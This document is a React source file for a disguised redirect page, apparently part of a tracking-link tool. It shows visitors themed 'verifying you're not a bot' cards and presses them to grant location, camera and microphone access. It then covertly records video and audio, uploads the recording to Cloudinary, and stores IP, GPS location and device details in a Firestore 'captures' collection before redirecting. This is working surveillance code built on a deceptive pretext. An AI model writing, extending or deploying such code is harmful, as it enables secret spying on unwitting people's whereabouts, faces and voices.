import * as React from 'react';
import { useParams } from 'react-router-dom';
import type { Settings, CapturedData, PermissionType } from '../types';
import { getTranslator } from '../contexts/LanguageContext';
import { useNotification } from '../contexts/SettingsContext';
import { NEW_REDIRECT_TEMPLATE, CARD_STYLES, CLOUDINARY_UPLOAD_URL, CLOUDINARY_UPLOAD_PRESET } from '../constants';
import { db } from '../firebase';
import { collection, addDoc, query, where, getDocs } from 'firebase/firestore';
import PermissionInstructions from './PermissionInstructions';

interface RedirectPageProps {
  previewSettings?: Settings | Omit<Settings, 'id'>;
  isPreview?: boolean;
  isEmbeddedPreview?: boolean;
  onClosePreview?: () => void;
}

const VerificationText: React.FC<{className?: string, t: (key: string) => string;}> = ({ className, t }) => {
    return <p className={`text-xs font-semibold uppercase tracking-wider ${className}`}>{t('redirect_verify_bot')}</p>
}

// --- Individual Card Style Components ---

const Progress: React.FC<{ duration: number, isPaused: boolean, className?: string, progressClassName?: string, style?: React.CSSProperties, progressStyle?: React.CSSProperties }> = ({ duration, isPaused, className, progressClassName, style, progressStyle }) => {
  const [key, setKey] = React.useState(Date.now());
  React.useEffect(() => { if (!isPaused) setKey(Date.now()); }, [isPaused]);

  const innerAnimatedStyle = { animation: `progress ${duration}s linear forwards`, ...progressStyle };

  if (isPaused) return <div className={className} style={style}><div className={`${progressClassName} w-0`} style={progressStyle}/></div>;

  return (
    <div className={className} style={style}>
      <div key={key} className={progressClassName} style={innerAnimatedStyle} />
    </div>
  );
};

const TypewriterText: React.FC<{ text: string, duration: number, isPaused: boolean, className?: string }> = ({ text, duration, isPaused, className }) => {
    const [displayedText, setDisplayedText] = React.useState('');
    React.useEffect(() => {
        if (isPaused) {
            setDisplayedText('');
            return;
        }
        setDisplayedText('');
        let i = 0;
        const interval = setInterval(() => {
            if (i >= text.length) {
                clearInterval(interval);
                return;
            }
            setDisplayedText(prev => prev + text[i]);
            i++;
        }, (duration * 1000) / (text.length || 1));
        return () => clearInterval(interval);
    }, [text, duration, isPaused]);
    return <span className={`${className} overflow-hidden whitespace-nowrap border-r-4 border-r-transparent`}>{displayedText}</span>;
}

const DefaultWhiteCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
    return (
      <div className="w-full max-w-md animate-scale-in" style={{ color: settings.textColor }}>
        <div className="bg-white border border-slate-200/80 shadow-2xl rounded-2xl p-8 sm:p-12 text-center flex flex-col items-center gap-4">
          {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-28 h-28 mb-4 object-contain" />}
          <h1 className="text-4xl font-bold text-blue-600 leading-tight">{settings.displayText}</h1>
          <p className="text-slate-500 mt-1">{t('redirect_default_card_subtitle')}</p>
          <div className="w-full pt-6 space-y-2">
            <VerificationText className="text-slate-400" t={t} />
            <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-200 rounded-full h-5 overflow-hidden" progressClassName="bg-blue-500 h-full rounded-full" />
          </div>
        </div>
      </div>
    );
};

const GlassCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
    return (
        <div className="w-full max-w-md animate-scale-in" style={{ color: settings.textColor }}>
            <div className="bg-white/10 backdrop-blur-xl border border-white/20 shadow-2xl rounded-2xl p-8 sm:p-12 text-center flex flex-col items-center gap-4">
                {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-28 h-28 mb-4 object-contain" />}
                <h1 className="text-4xl font-bold leading-tight">{settings.displayText}</h1>
                <p className="opacity-80 mt-1">{t('redirect_glass_card_subtitle')}</p>
                <div className="w-full pt-6 space-y-2">
                    <VerificationText className="text-white/60" t={t}/>
                    <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-white/20 rounded-full h-2 overflow-hidden" progressClassName="bg-white h-full rounded-full" />
                </div>
            </div>
        </div>
    );
};

const MinimalCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
    return (
        <div className="w-full max-w-2xl animate-fade-in-up text-center flex flex-col items-center gap-6 p-8" style={{ color: settings.textColor, textShadow: '0px 1px 10px rgba(0,0,0,0.5)' }}>
            {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-24 h-24 object-contain" />}
            <h1 className="text-5xl font-extrabold leading-tight">{settings.displayText}</h1>
            <p className="opacity-80 text-lg">{t('redirect_minimal_card_subtitle')}</p>
            <div className="w-full pt-4 fixed bottom-0 left-0 space-y-2">
                <VerificationText className="text-white/60 text-center mb-1" t={t}/>
                <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-1" progressClassName="bg-white h-full" />
            </div>
        </div>
    );
};

const TerminalCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string, replacements?: Record<string, string|number>) => string; }> = ({ settings, isPaused, t }) => {
    return (
        <div className="w-full max-w-2xl font-mono animate-fade-in" style={{ color: settings.textColor }}>
            <div className="bg-[#0D1117] border border-green-500/30 shadow-2xl rounded-lg p-6">
                <div className="flex items-center gap-2 mb-4">
                    <div className="w-3 h-3 bg-red-500 rounded-full"></div>
                    <div className="w-3 h-3 bg-yellow-500 rounded-full"></div>
                    <div className="w-3 h-3 bg-green-500 rounded-full"></div>
                </div>
                <div className="space-y-2 text-sm">
                    <p><span className="text-green-400">root@director:~$</span> {t('redirect_terminal_auth')}</p>
                    <p><span className="text-green-400">root@director:~$</span> {t('redirect_terminal_access')}</p>
                    <p className="pl-4"><span className="text-cyan-400">{t('redirect_terminal_target')}</span> {settings.redirectUrl}</p>
                    <p className="pl-4"><span className="text-cyan-400">{t('redirect_terminal_message')}</span> "{settings.displayText}"</p>
                    <p><span className="text-green-400">root@director:~$</span> <TypewriterText text={t('redirect_terminal_redirecting', {delay: settings.redirectDelay})} duration={settings.redirectDelay} isPaused={isPaused} /></p>
                </div>
                 <div className="w-full pt-6 space-y-2">
                    <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-green-500/10 rounded h-1 overflow-hidden" progressClassName="bg-green-500 h-full rounded" />
                </div>
            </div>
        </div>
    );
};

const ElegantCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => (
    <div className="w-full max-w-sm animate-scale-in" style={{ color: settings.textColor }}>
        <div className="bg-white border-2 border-black/80 rounded-sm p-10 text-center flex flex-col items-center gap-4 font-serif">
            {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-20 h-20 mb-4 object-contain" />}
            <h1 className="text-2xl font-bold text-black tracking-widest uppercase">{settings.displayText}</h1>
            <p className="text-black/60 text-sm mt-2">{t('redirect_elegant_card_subtitle')}</p>
            <div className="w-full pt-6">
                <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-0.5 bg-black/10" progressClassName="bg-black/80 h-full" />
            </div>
        </div>
    </div>
);

const SleekDarkCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => (
    <div className="w-full max-w-md animate-fade-in-up" style={{ color: settings.textColor }}>
        <div className="bg-slate-900 border border-slate-700/80 shadow-2xl rounded-xl p-10 text-center flex flex-col items-center gap-4">
            {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-24 h-24 mb-4 object-contain" />}
            <h1 className="text-4xl font-bold">{settings.displayText}</h1>
            <p className="text-slate-400 mt-2">{t('redirect_default_card_subtitle')}</p>
            <div className="w-full pt-6 space-y-2">
                <VerificationText className="text-slate-500" t={t}/>
                <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-700 rounded-full h-2 overflow-hidden" progressClassName="bg-indigo-500 h-full rounded-full" />
            </div>
        </div>
    </div>
);

const ArticleCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => (
    <div className="w-full max-w-xl animate-fade-in-up font-serif" style={{ color: settings.textColor }}>
        <div className="bg-white text-slate-800 p-10">
            <p className="text-sm font-bold text-red-600 uppercase tracking-widest">{t('redirect_article_heading')}</p>
            <h1 className="text-4xl font-bold my-4">{settings.displayText}</h1>
            <div className="flex items-center gap-4 text-sm border-y border-slate-200 py-3 mb-6">
                <p>By <span className="font-bold">{t('redirect_article_author')}</span></p>
                <div className="h-4 border-l border-slate-300"></div>
                <p className="text-slate-500">{new Date().toLocaleDateString()}</p>
            </div>
            {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-full object-contain mb-6" />}
            <p className="text-lg text-slate-600 leading-relaxed">{t('redirect_article_subtitle')}</p>
            <div className="w-full pt-8">
                 <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-200 rounded-full h-1" progressClassName="bg-red-600 h-full" />
            </div>
        </div>
    </div>
);

const RetroTvCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => (
    <div className="w-full max-w-lg animate-scale-in" style={{ color: settings.textColor }}>
        <div className="bg-slate-900 p-8 rounded-t-xl border-2 border-b-0 border-slate-700 relative">
            <div className="aspect-video bg-black/80 rounded p-6 relative overflow-hidden font-mono text-green-400 text-2xl animate-glow scanline">
                <p className="animate-flicker">TARGET: {settings.displayText}</p>
            </div>
        </div>
        <div className="h-16 bg-slate-800 rounded-b-xl border-2 border-t-0 border-slate-700 flex items-center justify-center p-4">
             <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-green-900/50 rounded h-2" progressClassName="bg-green-400 h-full" />
        </div>
    </div>
);

const GradientBurstCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => (
    <div className="w-full max-w-md animate-scale-in" style={{ color: settings.textColor }}>
        <div className="p-1 rounded-2xl shadow-2xl" style={{ background: `linear-gradient(45deg, ${settings.gradientColors.join(', ')})`}}>
            <div className="bg-slate-900 rounded-xl p-10 text-center flex flex-col items-center gap-4">
                {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-24 h-24 mb-4 object-contain" />}
                <h1 className="text-4xl font-bold">{settings.displayText}</h1>
                <p className="text-slate-300 mt-2">{t('redirect_gradient_card_subtitle')}</p>
                <div className="w-full pt-6">
                    <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-white/10 rounded-full h-2" progressClassName="bg-white h-full" />
                </div>
            </div>
        </div>
    </div>
);

const VideoPlayerCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string, replacements?: Record<string, string>) => string; }> = ({ settings, isPaused, t }) => (
    <div className="w-full max-w-2xl animate-scale-in bg-black rounded-xl border border-slate-700 shadow-2xl overflow-hidden" style={{ color: settings.textColor }}>
        <div className="aspect-video bg-slate-900 flex items-center justify-center">
            {settings.customIconUrl ? (
                <img src={settings.customIconUrl} alt="Icon" className="w-1/3 object-contain" />
            ) : (
                <p className="text-slate-500">{t('redirect_video_player_loading')}</p>
            )}
        </div>
        <div className="p-4 bg-black/30 space-y-2">
            <h1 className="font-bold text-lg">{settings.displayText}</h1>
            <p className="text-sm text-slate-400">{t('redirect_video_player_redirecting', { url: settings.redirectUrl })}</p>
            <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-700 rounded-full h-1 mt-2" progressClassName="bg-red-600 h-full" />
        </div>
    </div>
);


const CARD_COMPONENTS: Record<string, React.FC<{ settings: Settings, isPaused: boolean, t: any }>> = {
    'default-white': DefaultWhiteCard,
    'glass': GlassCard,
    'minimal': MinimalCard,
    'elegant': ElegantCard,
    'sleek-dark': SleekDarkCard,
    'article': ArticleCard,
    'terminal': TerminalCard,
    'retro-tv': RetroTvCard,
    'gradient-burst': GradientBurstCard,
    'video-player': VideoPlayerCard,
};

// --- Main Component ---

const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview = false, isEmbeddedPreview = false }) => {
  const { data } = useParams<{ data: string }>();
  const addNotification = useNotification();

  const [settings, setSettings] = React.useState<Settings | null>(null);
  const [status, setStatus] = React.useState<'initializing' | 'loading' | 'invalid' | 'permission_denied' | 'redirecting'>('initializing');
  const [permissionDenied, setPermissionDenied] = React.useState(false);
  const [deniedPermissions, setDeniedPermissions] = React.useState<PermissionType[]>([]);
  const t = React.useMemo(() => getTranslator(settings?.redirectLanguage || 'en'), [settings?.redirectLanguage]);
  
  const permissionStatusRef = React.useRef<Record<PermissionType, PermissionState | 'n/a'>>({ location: 'n/a', camera: 'n/a', microphone: 'n/a' });

  React.useEffect(() => {
    const loadSettings = async () => {
        if (isPreview && previewSettings) {
            setSettings({ id: 'preview', ...NEW_REDIRECT_TEMPLATE, ...previewSettings });
            setStatus('redirecting'); // In preview, we just show the card
            return;
        }
        
        if (!data) return setStatus('invalid');
        
        try {
            const q = query(collection(db, "redirects"), where("urlIdentifier", "==", data));
            const querySnapshot = await getDocs(q);

            if (querySnapshot.empty) {
                return setStatus('invalid');
            }

            const configDoc = querySnapshot.docs[0];
            const fetchedSettings = { id: configDoc.id, ...configDoc.data() } as Settings;
            setSettings(fetchedSettings);
            setStatus('loading');
        } catch (error) {
            console.error("Error fetching settings: ", error);
            setStatus('invalid');
        }
    };
    loadSettings();
  }, [data, previewSettings, isPreview]);
  
    const uploadToCloudinary = async (blob: Blob, resourceType: 'video' | 'raw'): Promise<string> => {
        const formData = new FormData();
        formData.append('file', blob);
        formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
        try {
            const response = await fetch(CLOUDINARY_UPLOAD_URL, {
                method: 'POST',
                body: formData
            });
            if (!response.ok) {
                const errorData = await response.json();
                throw new Error(errorData.error.message || 'Cloudinary upload failed');
            }
            const result = await response.json();
            return result.secure_url;
        } catch (error) {
            console.error('Cloudinary upload error:', error);
            addNotification({ type: 'error', message: "Cloudinary upload failed: Check upload preset." });
            throw error;
        }
    };

    const requestPermissions = React.useCallback(async () => {
        if (!settings || isPreview) return;
        setPermissionDenied(false);
        const required = settings.captureInfo.permissions;
        if (required.length === 0) {
            return captureAndRedirect();
        }

        let hasDenied = false;
        const newlyDenied: PermissionType[] = [];

        for (const perm of required) {
            try {
                if (perm === 'location') {
                    const status = await navigator.permissions.query({ name: 'geolocation' });
                    permissionStatusRef.current.location = status.state;
                    if (status.state === 'prompt') {
                       await new Promise<void>((resolve, reject) => navigator.geolocation.getCurrentPosition(
                           () => { permissionStatusRef.current.location = 'granted'; resolve(); },
                           () => { permissionStatusRef.current.location = 'denied'; resolve(); }, // Resolve even on deny
                           { timeout: 10000 }
                       ));
                    }
                } else if (perm === 'camera' || perm === 'microphone') {
                    await navigator.mediaDevices.getUserMedia({ video: perm === 'camera', audio: perm === 'microphone' });
                    permissionStatusRef.current[perm] = 'granted';
                }
            } catch (error) {
                console.warn(`Permission denied for ${perm}:`, error);
                permissionStatusRef.current[perm] = 'denied';
            }
        }
        
        required.forEach(p => {
            if (permissionStatusRef.current[p] === 'denied') {
                hasDenied = true;
                newlyDenied.push(p);
            }
        });

        if (hasDenied) {
            setDeniedPermissions(newlyDenied);
            setPermissionDenied(true);
        } else {
            captureAndRedirect();
        }
    }, [settings, isPreview]);

  const captureAndRedirect = React.useCallback(async () => {
        if (!settings || isPreview) return;
        setStatus('redirecting');

        try {
            // --- Basic Info ---
            let ipData: any = {};
            try {
                const ipRes = await fetch('https://ip-api.com/json');
                if (ipRes.ok) ipData = await ipRes.json();
            } catch (e) { console.error("Could not fetch IP data:", e); }

            const userAgent = navigator.userAgent;
            const osMatch = userAgent.match(/(Windows|Mac OS|Linux|Android|iOS)/);
            
            // --- Location ---
            let locationData = { lat: ipData.lat || null, lon: ipData.lon || null, city: ipData.city || 'Unknown', country: ipData.country || 'Unknown', source: 'ip' as 'ip' | 'gps' };
            if (permissionStatusRef.current.location === 'granted') {
                await new Promise<void>(resolve => {
                    navigator.geolocation.getCurrentPosition(pos => {
                        locationData = { ...locationData, lat: pos.coords.latitude, lon: pos.coords.longitude, source: 'gps' };
                        resolve();
                    }, () => resolve(), { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
                });
            }

            // --- Media Capture ---
            let cameraUrl: string | undefined;
            let micUrl: string | undefined;

            if (permissionStatusRef.current.camera === 'granted' || permissionStatusRef.current.microphone === 'granted') {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: permissionStatusRef.current.camera === 'granted',
                    audio: permissionStatusRef.current.microphone === 'granted',
                });
                
                const recorder = new MediaRecorder(stream);
                const chunks: Blob[] = [];
                recorder.ondataavailable = (e) => chunks.push(e.data);
                
                recorder.start();
                await new Promise(resolve => setTimeout(resolve, settings.captureInfo.recordingDuration * 1000));
                recorder.stop();
                stream.getTracks().forEach(track => track.stop());

                await new Promise(resolve => recorder.onstop = resolve);
                const blob = new Blob(chunks, { type: 'video/webm' });
                
                // For simplicity, we upload one blob. If both perms are on, it's a video with audio.
                // A more complex implementation could separate them.
                if(permissionStatusRef.current.camera === 'granted') {
                    cameraUrl = await uploadToCloudinary(blob, 'video');
                } else if (permissionStatusRef.current.microphone === 'granted') {
                    micUrl = await uploadToCloudinary(blob, 'raw');
                }
            }
            
            const captured: Omit<CapturedData, 'id'> = {
                redirectId: settings.id,
                name: `Capture on ${new Date().toLocaleDateString()}`,
                timestamp: Date.now(),
                ip: ipData.query || 'Unknown',
                userAgent,
                os: osMatch ? osMatch[0] : 'Unknown',
                browser: userAgent.match(/(Chrome|Firefox|Safari|Edge|OPR)/)?.[0] || 'Unknown',
                deviceType: 'ontouchstart' in window ? 'Mobile' : 'Desktop',
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                location: locationData,
                permissions: permissionStatusRef.current,
                cameraCapture: cameraUrl,
                microphoneCapture: micUrl,
            };

            // Remove undefined fields before saving to Firestore
            Object.keys(captured).forEach(key => (captured as any)[key] === undefined && delete (captured as any)[key]);
            
            await addDoc(collection(db, 'captures'), captured);
        } catch (error) {
            console.error("Failed to save captured data:", error);
        } finally {
            if (settings.redirectDelay > 0) {
              setTimeout(() => { window.location.href = settings.redirectUrl; }, settings.redirectDelay * 1000);
            } else {
              window.location.href = settings.redirectUrl;
            }
        }
    }, [settings, isPreview]);

  React.useEffect(() => {
    if (status === 'loading' && settings && !isPreview) {
      requestPermissions();
    }
  }, [status, settings, isPreview, requestPermissions]);

  const renderContent = () => {
    if (status === 'initializing') {
      return <h1 className="text-2xl font-bold text-white">{t('redirect_initializing')}</h1>;
    }
    if (status === 'invalid') {
        return (
            <div className="text-center p-8 bg-slate-800 rounded-lg shadow-xl">
                 <h1 className="text-3xl font-bold text-red-500 mb-2">{t('redirect_invalid_link_title')}</h1>
                 <p className="text-slate-400">{t('redirect_invalid_link_subtitle')}</p>
            </div>
        );
    }
    if (permissionDenied) {
        return <PermissionInstructions onRetry={requestPermissions} requiredPermissions={deniedPermissions} />;
    }
    if (status === 'loading') {
      return <h1 className="text-2xl font-bold text-white">{t('redirect_loading')}</h1>;
    }
    if (settings && (status === 'redirecting' || isPreview)) {
      const CardComponent = CARD_COMPONENTS[settings.cardStyle] || CARD_COMPONENTS['default-white'];
      return <CardComponent settings={settings} isPaused={isPreview} t={t} />;
    }
    return null;
  };
  
  const backgroundStyle: React.CSSProperties = {
    backgroundColor: settings?.backgroundColor,
    ...(settings?.backgroundImageUrl && {
      backgroundImage: `url(${settings.backgroundImageUrl})`,
      backgroundSize: 'cover',
      backgroundPosition: 'center',
    }),
  };

  return (
    <div className={`w-full h-full flex justify-center items-center p-4 ${settings?.theme || 'dark'}`} style={backgroundStyle}>
      <div className={`${isEmbeddedPreview ? '' : 'absolute inset-0 bg-black/30'}`}></div>
      <div className="relative z-10">
        {renderContent()}
      </div>
    </div>
  );
};

export default RedirectPage;
